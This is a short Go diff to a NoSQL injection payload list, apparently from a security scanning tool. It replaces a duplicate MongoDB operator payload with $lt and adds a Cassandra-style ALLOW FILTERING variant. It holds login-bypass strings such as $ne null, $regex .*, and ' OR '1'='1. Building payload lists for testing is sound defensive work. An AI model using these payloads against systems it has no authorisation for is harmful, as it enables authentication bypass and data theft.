@@ -8,7 +8,7 @@ var NoSQL = PayloadGroup{
 		// ═══════════════════════════════════════════
 		{Type: "boolean", Content: "{\"$gt\":\"\"}"},
 		{Type: "boolean", Content: "{\"$ne\":null}"},
-		{Type: "boolean", Content: "{\"$gt\":\"\"}"},
+		{Type: "boolean", Content: "{\"$lt\":\"\"}"},
 		{Type: "boolean", Content: "{\"$regex\":\".*\"}"},
 		{Type: "boolean", Content: "{\"$nin\":[]}"},
 		{Type: "boolean", Content: "{\"$exists\":true}"},
@@ -57,6 +57,6 @@ var NoSQL = PayloadGroup{
 		{Type: "boolean", Content: "' OR '1'='1"},
 		{Type: "boolean", Content: "admin' OR '1'='1"},
 		{Type: "boolean", Content: "' OR 1=1 ALLOW FILTERING--"},
-		{Type: "boolean", Content: "' OR 1=1--"},
+		{Type: "boolean", Content: "' OR '1'='1' ALLOW FILTERING--"},
 	},
 }
